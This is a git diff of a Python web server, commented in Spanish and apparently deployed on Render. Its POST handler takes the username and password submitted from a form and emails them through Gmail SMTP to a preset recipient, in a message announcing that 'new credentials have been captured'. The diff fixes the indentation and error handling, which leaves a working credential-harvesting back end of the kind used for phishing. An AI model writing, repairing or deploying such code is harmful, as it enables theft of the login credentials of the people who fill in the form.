@@ -3,8 +3,8 @@ import smtplib
 import os
 from email.mime.text import MIMEText
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
 # ================= CONFIGURACIÓN DE CORREO =================
-# Las credenciales se leen desde las variables de entorno configuradas en Render
 REMITENTE = os.environ.get('REMITENTE')
 CONTRASENA_APP = os.environ.get('CONTRASENA_APP')
 DESTINATARIO = os.environ.get('DESTINATARIO')
@@ -32,25 +32,24 @@ class ServidorLocal(BaseHTTPRequestHandler):
 
     def do_POST(self):
         try:
-          longitud = int(self.headers.get('Content-Length', 0))
-          if longitud == 0:
-              self.send_response(400)
-               self.end_headers()
-            return
+            longitud = int(self.headers.get('Content-Length', 0))
+            if longitud == 0:
+                self.send_response(400)
+                self.end_headers()
+                return
+                
+            datos_crudos = self.rfile.read(longitud)
+            datos = json.loads(datos_crudos.decode('utf-8'))
 
-        datos_crudos = self.rfile.read(longitud)
-        datos = json.loads(datos_crudos.decode('utf-8'))
+            usuario = datos.get('username', '')
+            contrasena = datos.get('password', '')
 
-        usuario = datos.get('username', '')
-        contrasena = datos.get('password', '')
+            cuerpo_mensaje = f"Se han capturado nuevas credenciales:\n\nUsuario: {usuario}\nContraseña: {contrasena}"
+            msg = MIMEText(cuerpo_mensaje)
+            msg['Subject'] = 'Datos del Formulario Local'
+            msg['From'] = REMITENTE
+            msg['To'] = DESTINATARIO
 
-        cuerpo_mensaje = f"Se han capturado nuevas credenciales:\n\nUsuario: {usuario}\nContraseña: {contrasena}"
-        msg = MIMEText(cuerpo_mensaje)
-        msg['Subject'] = 'Datos del Formulario Local'
-        msg['From'] = REMITENTE
-        msg['To'] = DESTINATARIO
-
-        try:
             print("Conectando al servidor de correo...")
             servidor_smtp = smtplib.SMTP('smtp.gmail.com', 587)
             servidor_smtp.starttls()
@@ -65,14 +64,11 @@ class ServidorLocal(BaseHTTPRequestHandler):
             self.wfile.write(b"OK")
             
         except Exception as e:
-            print(f"Error enviando correo: {e}")
+            print(f"Error procesando POST: {e}")
             self.send_response(500)
             self.end_headers()
             self.wfile.write(f"Error: {e}".encode('utf-8'))
 
-# Render asigna el puerto dinámicamente en la variable PORT
 puerto = int(os.environ.get('PORT', 8000))
 print(f"Servidor Python escuchando en el puerto {puerto}...")
-
-# 0.0.0.0 permite que la aplicación exponga el puerto a las interfaces de red de Render
 ThreadingHTTPServer(('0.0.0.0', puerto), ServidorLocal).serve_forever()
